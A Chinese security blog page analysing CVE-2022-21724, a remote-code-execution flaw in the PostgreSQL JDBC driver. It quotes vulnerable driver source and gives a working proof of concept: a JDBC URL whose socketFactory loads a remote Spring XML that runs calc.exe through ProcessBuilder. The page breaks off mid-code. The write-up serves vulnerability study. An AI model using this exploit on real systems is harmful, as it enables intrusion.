@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="CVE-2022-21724">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PostgreSQL JDBC RCE命令执行">
+<meta property="og:url" content="https://wanth3f1ag.top/2026/02/27/PostgreSQL-JDBC-RCE/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="CVE-2022-21724">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227113713096.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227114244445.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227114420562.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227115021295.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227114752714.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227115135258.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227115437326.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227115545803.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227115705481.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227115836799.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227115921945.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227124525770.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227124727627.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227124944109.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227124959105.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227121051810.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227125811748.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/1748832222454.png">
+<meta property="article:published_time" content="2026-02-27T08:09:53.000Z">
+<meta property="article:modified_time" content="2026-02-27T08:11:05.637Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227113713096.png">
+
+
+<link rel="canonical" href="https://wanth3f1ag.top/2026/02/27/PostgreSQL-JDBC-RCE/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2026/02/27/PostgreSQL-JDBC-RCE/","path":"2026/02/27/PostgreSQL-JDBC-RCE/","title":"PostgreSQL JDBC RCE命令执行"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PostgreSQL JDBC RCE命令执行 | root@wanth3f1ag</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">漏洞代码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E6%BA%AF%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">回溯分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%82%B9"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#socketFactory-socketFactoryArg"><span class="nav-number">3.3.1.</span> <span class="nav-text">socketFactory &amp; socketFactoryArg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sslfactory-sslfactoryarg"><span class="nav-number">3.3.2.</span> <span class="nav-text">sslfactory &amp; sslfactoryarg</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sink-Class"><span class="nav-number">3.4.</span> <span class="nav-text">Sink Class</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">4.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ClassPathXmlApplicationContext-FileSystemXmlApplicationContext"><span class="nav-number">4.1.</span> <span class="nav-text">ClassPathXmlApplicationContext&amp;FileSystemXmlApplicationContext</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">5.</span> <span class="nav-text">漏洞修复</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">186</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2026/02/27/PostgreSQL-JDBC-RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PostgreSQL JDBC RCE命令执行 | root@wanth3f1ag">
+      <meta itemprop="description" content="CVE-2022-21724">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PostgreSQL JDBC RCE命令执行
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-02-27 16:09:53 / 修改时间：16:11:05" itemprop="dateCreated datePublished" datetime="2026-02-27T16:09:53+08:00">2026-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/javasec/" itemprop="url" rel="index"><span itemprop="name">javasec</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>14k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>13 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">CVE-2022-21724</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>PostgreSQL JDBC RCE命令执行是22年爆出来的一个漏洞CVE-2022-21724</p>
+<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>PostgreSQL JDBC Driver是一个用 Pure Java（Type 4）编写的开源 JDBC 驱动程序，用于 PostgreSQL 本地网络协议中进行通信。</p>
+<p>pgjdbc 是 PostgreSQL 官方 JDBC 驱动，在使用当攻击者可以控制 jdbc url 或 properties 时，可能导致安全风险。原因是驱动程序在实例化部分属性对应类时，并未检查其是否实现自期望类或接口，导致恶意用户可以实例化任意类，并进一步达到 RCE。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>• &lt; 42.2.25<br>• &gt;&#x3D; 42.3.0，&lt; 42.3.2</p>
+<h1 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h1><p>在pom.xml中导入对应的PostgreSQL依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>漏洞点位于 <code>org.postgresql.util.ObjectFactory#instantiate()</code> 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">instantiate</span><span class="params">(String classname, Properties info, <span class="type">boolean</span> tryString,</span></span><br><span class="line"><span class="params">    <span class="meta">@Nullable</span> String stringarg)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException, SecurityException, NoSuchMethodException,</span><br><span class="line">        IllegalArgumentException, InstantiationException, IllegalAccessException,</span><br><span class="line">        InvocationTargetException &#123;</span><br><span class="line">  <span class="meta">@Nullable</span> Object[] args = &#123;info&#125;;</span><br><span class="line">  Constructor&lt;?&gt; ctor = <span class="literal">null</span>;</span><br><span class="line">  Class&lt;?&gt; cls = Class.forName(classname);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    ctor = cls.getConstructor(Properties.class);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (NoSuchMethodException ignored) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (tryString &amp;&amp; ctor == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      ctor = cls.getConstructor(String.class);</span><br><span class="line">      args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;stringarg&#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (ctor == <span class="literal">null</span>) &#123;</span><br><span class="line">    ctor = cls.getConstructor();</span><br><span class="line">    args = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ctor.newInstance(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此方法接收一个 Class 类名、Properties 对象、一个布尔值、一个 String 类型的参数。会根据传入的Class类名获取到对应的Properties类型的类构造器或者String类型的类构造器，如果前两者都没有就会获取到其无参构造器，最后进行一个实例化的操作</p>
+<p>所以满足如下条件的 Class 可以利用：</p>
+<ol>
+<li>存在 Properties 构造方法，且构造方法中达到恶意目的；</li>
+<li>存在单 String 构造方法，且构造方法中达到恶意目的。</li>
+<li>存在无参数构造方法，且构造方法中达到恶意目的。</li>
+</ol>
+<p>我们可以寻找到 spring 框架中的如下两个类来进行利用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.context.support.ClassPathXmlApplicationContext</span><br><span class="line">org.springframework.context.support.FileSystemXmlApplicationContext</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们回溯如何调用到instantiate方法</p>
+<h2 id="回溯分析"><a href="#回溯分析" class="headerlink" title="回溯分析"></a>回溯分析</h2><p>写个漏洞demo调试吧</p>
+<p>还需要额外导入Spring依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context-support<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后写一个demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> PostgreSQLJDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2022_21724</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span>  <span class="operator">=</span> <span class="string">&quot;http:127.0.0.1/poc.xml&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql:///?socketFactory=&quot;</span>+socketFactoryClass+<span class="string">&quot;&amp;amp;socketFactoryArg=&quot;</span>+socketFactoryArg;</span><br><span class="line">        System.out.println(dbUrl);</span><br><span class="line">        DriverManager.getConnection(dbUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在恶意poc.xml文件下填入以下内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;test.start()&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在getConnection处打上断点进行调试，首先是<code>java.sql.DriverManager#getConnection()</code></p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227113713096.png" alt="image-20260227113713096"></p>
+<p>这里会尝试调用driver的connect方法，这里的driver就是org.postgresql.Driver</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@Nullable</span> Connection <span class="title function_">connect</span><span class="params">(String url, <span class="meta">@Nullable</span> Properties info)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  <span class="keyword">if</span> (url == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;url is null&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// get defaults</span></span><br><span class="line">  Properties defaults;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!url.startsWith(<span class="string">&quot;jdbc:postgresql:&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    defaults = getDefaultProperties();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PSQLException</span>(GT.tr(<span class="string">&quot;Error loading default settings from driverconfig.properties&quot;</span>),</span><br><span class="line">        PSQLState.UNEXPECTED_ERROR, ioe);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// override defaults with provided properties</span></span><br><span class="line">  <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>(defaults);</span><br><span 